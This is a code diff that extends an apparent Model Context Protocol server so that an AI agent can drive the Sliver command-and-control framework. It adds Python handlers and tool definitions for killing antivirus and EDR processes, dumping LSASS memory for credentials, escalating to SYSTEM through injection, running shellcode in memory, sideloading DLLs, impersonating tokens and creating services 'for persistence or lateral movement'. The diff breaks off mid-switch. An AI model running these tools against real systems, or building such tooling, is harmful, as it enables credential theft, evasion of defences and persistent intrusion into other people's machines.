@@ -542,7 +542,7 @@ async def execute_command(client, command, params):
             "hint": "Beacon perlu check-in. Cek interval beacon dan coba lagi."
         }
 
-    elif command == "beacon_rm":
+    elif command == "beacon_delete":
         beacon_id = params.get("beacon_id")
         if not beacon_id:
             return {"error": "beacon_id required"}
@@ -996,6 +996,449 @@ async def execute_command(client, command, params):
             "goos": goos, "goarch": goarch,
             "is_beacon": is_beacon, "format": format_str
         }
+
+    # ── Terminate ──────────────────────────────────────────────────────────
+    elif command == "session_terminate":
+        session_id = params.get("session_id")
+        pid = int(params.get("pid", 0))
+        force = params.get("force", False)
+        if not session_id or not pid:
+            return {"error": "session_id and pid required"}
+        interact = await client.interact_session(session_id)
+        r = await interact.terminate(pid, force=force)
+        return {"success": True, "pid": r.Pid}
+
+    elif command == "beacon_terminate":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2t
+        beacon_id = params.get("beacon_id")
+        pid = int(params.get("pid", 0))
+        force = params.get("force", False)
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or not pid:
+            return {"error": "beacon_id and pid required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.terminate(pid, force=force)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2t.Terminate()
+                    r.ParseFromString(tc.Response)
+                    return {"success": True, "task_id": task_id, "pid": r.Pid}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Process Dump ───────────────────────────────────────────────────────
+    elif command == "session_process_dump":
+        import os as _os
+        session_id = params.get("session_id")
+        pid = int(params.get("pid", 0))
+        save_path = params.get("save_path", "/tmp/procdump.bin")
+        if not session_id or not pid:
+            return {"error": "session_id and pid required"}
+        interact = await client.interact_session(session_id)
+        r = await interact.process_dump(pid)
+        if r.Data:
+            _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
+            with open(save_path, 'wb') as _f:
+                _f.write(r.Data)
+        return {"success": True, "save_path": save_path, "size": len(r.Data) if r.Data else 0}
+
+    elif command == "beacon_process_dump":
+        import time as _time, os as _os
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2pd
+        beacon_id = params.get("beacon_id")
+        pid = int(params.get("pid", 0))
+        save_path = params.get("save_path", "/tmp/procdump.bin")
+        timeout_secs = int(params.get("timeout", 300))
+        if not beacon_id or not pid:
+            return {"error": "beacon_id and pid required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.process_dump(pid)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2pd.ProcessDump()
+                    r.ParseFromString(tc.Response)
+                    if r.Data:
+                        _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
+                        with open(save_path, 'wb') as _f:
+                            _f.write(r.Data)
+                    return {"success": True, "task_id": task_id, "save_path": save_path, "size": len(r.Data) if r.Data else 0}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Get System (privesc → SYSTEM) ──────────────────────────────────────
+    elif command == "session_get_system":
+        from sliver.pb.clientpb import client_pb2 as _client_pb2gs
+        session_id = params.get("session_id")
+        hosting_process = params.get("hosting_process", "spoolsv.exe")
+        c2_urls = params.get("c2", [])
+        if not session_id or not c2_urls:
+            return {"error": "session_id and c2 (list) required"}
+        cfg = _client_pb2gs.ImplantConfig(
+            IsBeacon=False, GOOS="windows", GOARCH="amd64",
+            C2=[_client_pb2gs.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)]
+        )
+        interact = await client.interact_session(session_id)
+        r = await interact.get_system(hosting_process, cfg)
+        return {"success": True, "session_id": session_id}
+
+    elif command == "beacon_get_system":
+        import time as _time
+        from sliver.pb.clientpb import client_pb2 as _client_pb2bgs
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bgs
+        beacon_id = params.get("beacon_id")
+        hosting_process = params.get("hosting_process", "spoolsv.exe")
+        c2_urls = params.get("c2", [])
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or not c2_urls:
+            return {"error": "beacon_id and c2 (list) required"}
+        cfg = _client_pb2bgs.ImplantConfig(
+            IsBeacon=False, GOOS="windows", GOARCH="amd64",
+            C2=[_client_pb2bgs.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)]
+        )
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.get_system(hosting_process, cfg)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2bgs.GetSystem()
+                    r.ParseFromString(tc.Response)
+                    return {"success": True, "task_id": task_id}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Execute Shellcode ──────────────────────────────────────────────────
+    elif command == "session_execute_shellcode":
+        import base64 as _b64
+        session_id = params.get("session_id")
+        shellcode_b64 = params.get("shellcode_b64")
+        shellcode_path = params.get("shellcode_path")
+        pid = int(params.get("pid", 0))
+        rwx = params.get("rwx", False)
+        if not session_id or (not shellcode_b64 and not shellcode_path):
+            return {"error": "session_id and shellcode_b64 or shellcode_path required"}
+        if shellcode_path:
+            with open(shellcode_path, 'rb') as _f:
+                data = _f.read()
+        else:
+            data = _b64.b64decode(shellcode_b64)
+        interact = await client.interact_session(session_id)
+        r = await interact.execute_shellcode(data, rwx, pid)
+        return {"success": True}
+
+    elif command == "beacon_execute_shellcode":
+        import time as _time, base64 as _b64
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2sc
+        beacon_id = params.get("beacon_id")
+        shellcode_b64 = params.get("shellcode_b64")
+        shellcode_path = params.get("shellcode_path")
+        pid = int(params.get("pid", 0))
+        rwx = params.get("rwx", False)
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or (not shellcode_b64 and not shellcode_path):
+            return {"error": "beacon_id and shellcode_b64 or shellcode_path required"}
+        if shellcode_path:
+            with open(shellcode_path, 'rb') as _f:
+                data = _f.read()
+        else:
+            data = _b64.b64decode(shellcode_b64)
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.execute_shellcode(data, rwx, pid)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    return {"success": True, "task_id": task_id}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Sideload ───────────────────────────────────────────────────────────
+    elif command == "session_sideload":
+        session_id = params.get("session_id")
+        lib_path = params.get("lib_path")
+        process_name = params.get("process_name", "notepad.exe")
+        arguments = params.get("arguments", "")
+        entry_point = params.get("entry_point", "")
+        kill = params.get("kill", True)
+        if not session_id or not lib_path:
+            return {"error": "session_id and lib_path required"}
+        with open(lib_path, 'rb') as _f:
+            data = _f.read()
+        interact = await client.interact_session(session_id)
+        r = await interact.sideload(data, process_name, arguments, entry_point, kill)
+        return {"success": True, "result": r.Result.decode('utf-8', errors='replace') if r.Result else ""}
+
+    elif command == "beacon_sideload":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2sl
+        beacon_id = params.get("beacon_id")
+        lib_path = params.get("lib_path")
+        process_name = params.get("process_name", "notepad.exe")
+        arguments = params.get("arguments", "")
+        entry_point = params.get("entry_point", "")
+        kill = params.get("kill", True)
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or not lib_path:
+            return {"error": "beacon_id and lib_path required"}
+        with open(lib_path, 'rb') as _f:
+            data = _f.read()
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.sideload(data, process_name, arguments, entry_point, kill)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2sl.Sideload()
+                    r.ParseFromString(tc.Response)
+                    return {"success": True, "task_id": task_id, "result": r.Result.decode('utf-8', errors='replace') if r.Result else ""}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Env Vars ───────────────────────────────────────────────────────────
+    elif command == "session_get_env":
+        session_id = params.get("session_id")
+        name = params.get("name", "")
+        if not session_id:
+            return {"error": "session_id required"}
+        interact = await client.interact_session(session_id)
+        r = await interact.get_env(name)
+        return {"variables": {v.Key: v.Value for v in r.Variables}}
+
+    elif command == "session_set_env":
+        session_id = params.get("session_id")
+        name = params.get("name")
+        value = params.get("value", "")
+        if not session_id or not name:
+            return {"error": "session_id and name required"}
+        interact = await client.interact_session(session_id)
+        await interact.set_env(name, value)
+        return {"success": True, "name": name, "value": value}
+
+    elif command == "beacon_get_env":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2env
+        beacon_id = params.get("beacon_id")
+        name = params.get("name", "")
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id:
+            return {"error": "beacon_id required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.get_env(name)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2env.EnvInfo()
+                    r.ParseFromString(tc.Response)
+                    return {"success": True, "task_id": task_id, "variables": {v.Key: v.Value for v in r.Variables}}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Token Ops ──────────────────────────────────────────────────────────
+    elif command == "session_impersonate":
+        session_id = params.get("session_id")
+        username = params.get("username")
+        if not session_id or not username:
+            return {"error": "session_id and username required"}
+        interact = await client.interact_session(session_id)
+        r = await interact.impersonate(username)
+        return {"success": True}
+
+    elif command == "session_make_token":
+        session_id = params.get("session_id")
+        username = params.get("username")
+        password = params.get("password")
+        domain = params.get("domain", "")
+        if not session_id or not username or not password:
+            return {"error": "session_id, username, password required"}
+        interact = await client.interact_session(session_id)
+        r = await interact.make_token(username, password, domain)
+        return {"success": True}
+
+    elif command == "session_revert_to_self":
+        session_id = params.get("session_id")
+        if not session_id:
+            return {"error": "session_id required"}
+        interact = await client.interact_session(session_id)
+        await interact.revert_to_self()
+        return {"success": True}
+
+    # ── Beacon File Ops (async parity) ─────────────────────────────────────
+    elif command == "beacon_cd":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bcd
+        beacon_id = params.get("beacon_id")
+        path = params.get("path")
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or not path:
+            return {"error": "beacon_id and path required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.cd(path)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2bcd.Pwd()
+                    r.ParseFromString(tc.Response)
+                    return {"success": True, "task_id": task_id, "path": r.Path}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    elif command == "beacon_pwd":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bpwd
+        beacon_id = params.get("beacon_id")
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id:
+            return {"error": "beacon_id required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.pwd()
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    r = _sliver_pb2bpwd.Pwd()
+                    r.ParseFromString(tc.Response)
+                    return {"success": True, "task_id": task_id, "path": r.Path}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    elif command == "beacon_mkdir":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bmk
+        beacon_id = params.get("beacon_id")
+        path = params.get("path")
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or not path:
+            return {"error": "beacon_id and path required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.mkdir(path)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    return {"success": True, "task_id": task_id, "path": path}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    elif command == "beacon_file_rm":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2brm
+        beacon_id = params.get("beacon_id")
+        path = params.get("path")
+        recursive = params.get("recursive", False)
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id or not path:
+            return {"error": "beacon_id and path required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.rm(path, recursive=recursive)
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    return {"success": True, "task_id": task_id, "path": path}
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    elif command == "beacon_netstat":
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bns
+        beacon_id = params.get("beacon_id")
+        timeout_secs = int(params.get("timeout", 120))
+        if not beacon_id:
+            return {"error": "beacon_id required"}
+        interact = await client.interact_beacon(beacon_id)
+        task = await interact.netstat()
+        task_id = task.ID
+        deadline = _time.time() + timeout_secs
+        while _time.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    ns = _sliver_pb2bns.NetstatResponse()
+                    ns.ParseFromString(tc.Response)
+                    return {
+                        "success": True, "task_id": task_id,
+                        "entries": [{"local": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port}, "remote": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None, "protocol": e.Protocol, "state": e.SkState, "pid": e.Pid} for e in ns.Entries[:50]]
+                    }
+            except Exception: pass
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
+
+    # ── Windows Services ───────────────────────────────────────────────────
+    elif command == "session_start_service":
+        session_id = params.get("session_id")
+        name = params.get("name")
+        description = params.get("description", "")
+        exe = params.get("exe")
+        hostname = params.get("hostname", "")
+        arguments = params.get("arguments", "")
+        if not session_id or not name or not exe:
+            return {"error": "session_id, name, exe required"}
+        interact = await client.interact_session(session_id)
+        r = await interact.start_service(name, description, exe, hostname, arguments)
+        return {"success": True, "name": name}
+
+    elif command == "session_stop_service":
+        session_id = params.get("session_id")
+        name = params.get("name")
+        hostname = params.get("hostname", "")
+        if not session_id or not name:
+            return {"error": "session_id and name required"}
+        interact = await client.interact_session(session_id)
+        await interact.stop_service(name, hostname)
+        return {"success": True, "name": name}
+
+    # ── Client Utility ─────────────────────────────────────────────────────
+    elif command == "rename_session":
+        session_id = params.get("session_id")
+        name = params.get("name")
+        if not session_id or not name:
+            return {"error": "session_id and name required"}
+        await client.rename_session(session_id, name)
+        return {"success": True, "session_id": session_id, "name": name}
+
+    elif command == "delete_implant_build":
+        implant_name = params.get("name")
+        if not implant_name:
+            return {"error": "name required"}
+        await client.delete_implant_build(implant_name)
+        return {"success": True, "name": implant_name}
 
     # Pivot commands
     elif command == "pivot_listeners":
@@ -1860,6 +2303,362 @@ const SLIVER_TOOLS: Tool[] = [
     },
   },
 
+  // ── Terminate ──────────────────────────────────────────────────────────
+  {
+    name: "sliver_terminate",
+    description: "Kill a remote process (session). Use to stop AV/EDR or target process.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        pid: { type: "number", description: "Process ID to terminate" },
+        force: { type: "boolean", description: "Force kill", default: false },
+      },
+      required: ["session_id", "pid"],
+    },
+  },
+  {
+    name: "sliver_beacon_terminate",
+    description: "Kill a remote process via beacon (async). Use to stop AV/EDR or target process.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        pid: { type: "number", description: "Process ID to terminate" },
+        force: { type: "boolean", description: "Force kill", default: false },
+        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
+      },
+      required: ["beacon_id", "pid"],
+    },
+  },
+
+  // ── Process Dump ───────────────────────────────────────────────────────
+  {
+    name: "sliver_process_dump",
+    description: "Dump remote process memory to local file (session). LSASS: pid=lsass PID, save_path=/tmp/lsass.dmp",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        pid: { type: "number", description: "PID of process to dump (e.g. LSASS PID)" },
+        save_path: { type: "string", description: "Local path to save dump (default: /tmp/procdump.bin)", default: "/tmp/procdump.bin" },
+      },
+      required: ["session_id", "pid"],
+    },
+  },
+  {
+    name: "sliver_beacon_process_dump",
+    description: "Dump remote process memory via beacon (async). LSASS dump: find lsass PID first with beacon_ps.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        pid: { type: "number", description: "PID to dump (e.g. LSASS PID)" },
+        save_path: { type: "string", description: "Local path to save dump (default: /tmp/procdump.bin)", default: "/tmp/procdump.bin" },
+        timeout: { type: "number", description: "Seconds to wait (default: 300)", default: 300 },
+      },
+      required: ["beacon_id", "pid"],
+    },
+  },
+
+  // ── Get System (privesc) ───────────────────────────────────────────────
+  {
+    name: "sliver_get_system",
+    description: "Attempt to escalate to SYSTEM via process injection (session, Windows only). Requires LOCAL ADMIN.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID (must be LOCAL ADMIN)" },
+        c2: { type: "array", items: { type: "string" }, description: "C2 URL list for injected implant (e.g. [\"https://c2.proxmoxlab.cloud\"])" },
+        hosting_process: { type: "string", description: "Process to inject into (default: spoolsv.exe)", default: "spoolsv.exe" },
+      },
+      required: ["session_id", "c2"],
+    },
+  },
+  {
+    name: "sliver_beacon_get_system",
+    description: "Attempt to escalate to SYSTEM via beacon (async, Windows only). Requires LOCAL ADMIN.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID (must be LOCAL ADMIN)" },
+        c2: { type: "array", items: { type: "string" }, description: "C2 URL list (e.g. [\"https://c2.proxmoxlab.cloud\"])" },
+        hosting_process: { type: "string", description: "Host process (default: spoolsv.exe)", default: "spoolsv.exe" },
+        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
+      },
+      required: ["beacon_id", "c2"],
+    },
+  },
+
+  // ── Execute Shellcode ──────────────────────────────────────────────────
+  {
+    name: "sliver_execute_shellcode",
+    description: "Execute raw shellcode in-memory via session. Provide shellcode as base64 or path to local .bin file.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        shellcode_b64: { type: "string", description: "Shellcode as base64 string (alternative to shellcode_path)" },
+        shellcode_path: { type: "string", description: "Local path to raw .bin shellcode (alternative to shellcode_b64)" },
+        pid: { type: "number", description: "Target PID to inject into (0 = self)", default: 0 },
+        rwx: { type: "boolean", description: "Use RWX memory pages", default: false },
+      },
+      required: ["session_id"],
+    },
+  },
+  {
+    name: "sliver_beacon_execute_shellcode",
+    description: "Execute raw shellcode in-memory via beacon (async). Provide base64 or path.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        shellcode_b64: { type: "string", description: "Shellcode as base64" },
+        shellcode_path: { type: "string", description: "Local path to .bin shellcode" },
+        pid: { type: "number", description: "Target PID (0 = self)", default: 0 },
+        rwx: { type: "boolean", description: "Use RWX pages", default: false },
+        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
+      },
+      required: ["beacon_id"],
+    },
+  },
+
+  // ── Sideload ───────────────────────────────────────────────────────────
+  {
+    name: "sliver_sideload",
+    description: "Sideload a shared library (.dll/.so) into a remote process via session (in-memory, no disk).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        lib_path: { type: "string", description: "Local path to shared library (.dll/.so)" },
+        process_name: { type: "string", description: "Host process name (default: notepad.exe)", default: "notepad.exe" },
+        arguments: { type: "string", description: "Arguments passed to DLL", default: "" },
+        entry_point: { type: "string", description: "Entry point export name (empty = default)", default: "" },
+        kill: { type: "boolean", description: "Kill host process after execution", default: true },
+      },
+      required: ["session_id", "lib_path"],
+    },
+  },
+  {
+    name: "sliver_beacon_sideload",
+    description: "Sideload a shared library via beacon (async, in-memory).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        lib_path: { type: "string", description: "Local path to .dll/.so" },
+        process_name: { type: "string", description: "Host process (default: notepad.exe)", default: "notepad.exe" },
+        arguments: { type: "string", description: "Arguments", default: "" },
+        entry_point: { type: "string", description: "Entry point export", default: "" },
+        kill: { type: "boolean", description: "Kill host process after", default: true },
+        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
+      },
+      required: ["beacon_id", "lib_path"],
+    },
+  },
+
+  // ── Env Vars ───────────────────────────────────────────────────────────
+  {
+    name: "sliver_get_env",
+    description: "Get environment variables from target (session). Leave name empty to get all.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        name: { type: "string", description: "Variable name (empty = all)", default: "" },
+      },
+      required: ["session_id"],
+    },
+  },
+  {
+    name: "sliver_set_env",
+    description: "Set an environment variable on target (session).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        name: { type: "string", description: "Variable name" },
+        value: { type: "string", description: "Value to set" },
+      },
+      required: ["session_id", "name", "value"],
+    },
+  },
+  {
+    name: "sliver_beacon_get_env",
+    description: "Get environment variables from beacon target (async).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        name: { type: "string", description: "Variable name (empty = all)", default: "" },
+        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
+      },
+      required: ["beacon_id"],
+    },
+  },
+
+  // ── Token Ops ──────────────────────────────────────────────────────────
+  {
+    name: "sliver_impersonate",
+    description: "Impersonate a Windows user token (session). Use after finding token with ps.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        username: { type: "string", description: "Username to impersonate (e.g. DOMAIN\\\\user)" },
+      },
+      required: ["session_id", "username"],
+    },
+  },
+  {
+    name: "sliver_make_token",
+    description: "Create an impersonation token with plaintext credentials (session, Windows only).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        username: { type: "string", description: "Username" },
+        password: { type: "string", description: "Password" },
+        domain: { type: "string", description: "Domain (empty = local)", default: "" },
+      },
+      required: ["session_id", "username", "password"],
+    },
+  },
+  {
+    name: "sliver_revert_to_self",
+    description: "Drop impersonation token and revert to original process token (session).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+      },
+      required: ["session_id"],
+    },
+  },
+
+  // ── Beacon File Ops (async parity) ─────────────────────────────────────
+  {
+    name: "sliver_beacon_cd",
+    description: "Change directory on beacon target (async).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        path: { type: "string", description: "Path to change to" },
+        timeout: { type: "number", default: 120 },
+      },
+      required: ["beacon_id", "path"],
+    },
+  },
+  {
+    name: "sliver_beacon_pwd",
+    description: "Get current directory on beacon target (async).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        timeout: { type: "number", default: 120 },
+      },
+      required: ["beacon_id"],
+    },
+  },
+  {
+    name: "sliver_beacon_mkdir",
+    description: "Create directory on beacon target (async).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        path: { type: "string", description: "Directory path to create" },
+        timeout: { type: "number", default: 120 },
+      },
+      required: ["beacon_id", "path"],
+    },
+  },
+  {
+    name: "sliver_beacon_file_rm",
+    description: "Remove file or directory on beacon target (async).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        path: { type: "string", description: "Path to remove" },
+        recursive: { type: "boolean", description: "Remove recursively", default: false },
+        timeout: { type: "number", default: 120 },
+      },
+      required: ["beacon_id", "path"],
+    },
+  },
+  {
+    name: "sliver_beacon_netstat",
+    description: "Get network connections on beacon target (async).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        timeout: { type: "number", default: 120 },
+      },
+      required: ["beacon_id"],
+    },
+  },
+
+  // ── Windows Services ───────────────────────────────────────────────────
+  {
+    name: "sliver_start_service",
+    description: "Create and start a Windows service (session). Useful for persistence or lateral movement.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        name: { type: "string", description: "Service name" },
+        exe: { type: "string", description: "Path to service executable" },
+        description: { type: "string", description: "Service description", default: "" },
+        hostname: { type: "string", description: "Target hostname (empty = local)", default: "" },
+        arguments: { type: "string", description: "Service arguments", default: "" },
+      },
+      required: ["session_id", "name", "exe"],
+    },
+  },
+  {
+    name: "sliver_stop_service",
+    description: "Stop a Windows service (session).",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        name: { type: "string", description: "Service name to stop" },
+        hostname: { type: "string", description: "Target hostname (empty = local)", default: "" },
+      },
+      required: ["session_id", "name"],
+    },
+  },
+
+  // ── Client Utility ─────────────────────────────────────────────────────
+  {
+    name: "sliver_rename_session",
+    description: "Rename a session for better OPSEC/organization.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        name: { type: "string", description: "New name" },
+      },
+      required: ["session_id", "name"],
+    },
+  },
+  {
+    name: "sliver_delete_build",
+    description: "Delete an implant build from the server by name. Use sliver_implant_builds to list names.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        name: { type: "string", description: "Implant build name to delete" },
+      },
+      required: ["name"],
+    },
+  },
+
   // Pivots
   {
     name: "sliver_pivot_listeners",
@@ -2059,7 +2858,7 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
         break;
 
       case "sliver_beacon_rm":
-        result = await executeSliverCommand("beacon_rm", args as Record<string, unknown>);
+        result = await executeSliverCommand("beacon_delete", args as Record<string, unknown>);
         break;
 
       case "sliver_beacon_execute":
@@ -2128,6 +2927,106 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
 
       case "sliver_generate":
         result = await executeSliverCommand("generate_implant", args as Record<string, unknown>);
+        break;
+
+      case "sliver_terminate":
+        result = await executeSliverCommand("session_terminate", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_terminate":
+        result = await executeSliverCommand("beacon_terminate", args as Record<string, unknown>);
+        break;
+
+      case "sliver_process_dump":
+        result = await executeSliverCommand("session_process_dump", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_process_dump":
+        result = await executeSliverCommand("beacon_process_dump", args as Record<string, unknown>);
+        break;
+
+      case "sliver_get_system":
+        result = await executeSliverCommand("session_get_system", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_get_system":
+        result = await executeSliverCommand("beacon_get_system", args as Record<string, unknown>);
+        break;
+
+      case "sliver_execute_shellcode":
+        result = await executeSliverCommand("session_execute_shellcode", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_execute_shellcode":
+        result = await executeSliverCommand("beacon_execute_shellcode", args as Record<string, unknown>);
+        break;
+
+      case "sliver_sideload":
+        result = await executeSliverCommand("session_sideload", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_sideload":
+        result = await executeSliverCommand("beacon_sideload", args as Record<string, unknown>);
+        break;
+
+      case "sliver_get_env":
+        result = await executeSliverCommand("session_get_env", args as Record<string, unknown>);
+        break;
+
+      case "sliver_set_env":
+        result = await executeSliverCommand("session_set_env", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_get_env":
+        result = await executeSliverCommand("beacon_get_env", args as Record<string, unknown>);
+        break;
+
+      case "sliver_impersonate":
+        result = await executeSliverCommand("session_impersonate", args as Record<string, unknown>);
+        break;
+
+      case "sliver_make_token":
+        result = await executeSliverCommand("session_make_token", args as Record<string, unknown>);
+        break;
+
+      case "sliver_revert_to_self":
+        result = await executeSliverCommand("session_revert_to_self", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_cd":
+        result = await executeSliverCommand("beacon_cd", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_pwd":
+        result = await executeSliverCommand("beacon_pwd", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_mkdir":
+        result = await executeSliverCommand("beacon_mkdir", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_file_rm":
